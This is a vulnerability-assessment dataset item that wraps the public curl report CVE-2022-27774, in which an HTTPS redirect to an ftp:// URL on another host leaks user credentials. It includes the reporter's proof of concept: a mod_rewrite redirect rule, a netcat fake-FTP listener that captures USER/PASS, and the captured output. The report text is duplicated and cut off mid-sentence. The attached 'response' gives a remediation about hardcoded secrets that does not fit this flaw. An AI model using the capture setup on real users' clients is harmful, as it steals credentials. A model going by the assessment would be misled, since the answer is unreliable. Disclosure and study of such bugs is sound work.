# SECRETS — h1

- source: h1
- class: secrets
- cwe: CWE-522
- cve: ['CVE-2022-27774']
- severity: high
- program: curl
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** CVE-2022-27774: Credential leak on redirect
**Affected Asset:** https://github.com/curl/curl

**Vulnerability Description:**
## Summary:
Curl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect to ftp:// URL.

## Steps To Reproduce:

  1. Configure for example Apache2 on `firstsite.tld` to perform redirect with mod_rewrite:
     ```
    RewriteCond %{HTTP_USER_AGENT} "^curl/"
    RewriteRule ^/redirectpoc ftp://secondsite.tld:9999 [R=301,L]
     ```
  2. Capture credentials at `secondsite.tld` for example with:
     ```
     while true; do echo -e "220 pocftp\n331 plz\n530 bye" | nc -v -l -p 9999; done
     ```
  3. `curl -L --user foo  https://firstsite.tld/redirectpoc`
  4. The entered password is visible in the fake FTP server:
```
Listening on [REDACTED_PHONE]
Connection received on somehost someport
USER foo
PASS secretpassword
```

There are several issues here:
1. The credentials are sent to a completely different host than the original host (`firstsite.tld` vs `secondsite.tld`). This is definitely not what the user could expect, considering the documentation says:
> When authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password. See also --location-trusted on how to change this.
2. The redirect crosses from secure context (HTTPS) to insecure one (FTP). That is the credentials are unexpectedly sent over insecure channels even when the URL specified is using HTTPS.

I believe the credentials should not be sent in this case unless if `--location-trusted` is used.

It might even be sensible to consider making curl stop sending credentials over downgraded security by default even when `--location-trusted` is used. Maybe there could be some option that could be used to enable such downgrade if the user REALLY wants it.

## Impact

Leak of confidential information (user credentials).

**Steps to Reproduce:**
1. Configure for example Apache2 on `firstsite.tld` to perform redirect with mod_rewrite:
     ```
    RewriteCond %{HTTP_USER_AGENT} "^curl/"
    RewriteRule ^/redirectpoc ftp://secondsite.tld:9999 [R=301,L]
     ```
  2. Capture credentials at `secondsite.tld` for example with:
     ```
     while true; do echo -e "220 pocftp\n331 plz\n530 bye" | nc -v -l -p 9999; done
     ```
  3. `curl -L --user foo  https://firstsite.tld/redirectpoc`
  4. The entered password is visible in the fake FTP server:
```
Listening on [REDACTED_PHONE]
Connection received on somehost someport
USER foo
PASS secretpassword
```

There are several issues here:
1. The credentials are sent to a completely different host than the original host (`firstsite.tld` vs `secondsite.tld`). This is definitely not what the user could expect, considering the documentation says:
> When authentication is used, curl only sends its

## Analysis / Response

**Vulnerability Class:** secrets
**CWE:** CWE-522
**Weakness:** Insufficiently Protected Credentials
**Severity:** high
**Endpoint Pattern:** https://firstsite.tld/redirectpoc

**Impact Assessment:**
Leak of confidential information (user credentials).

**Remediation:**
Remove hardcoded secrets from source code. Use environment variables or secret management services. Rotate exposed credentials immediately.
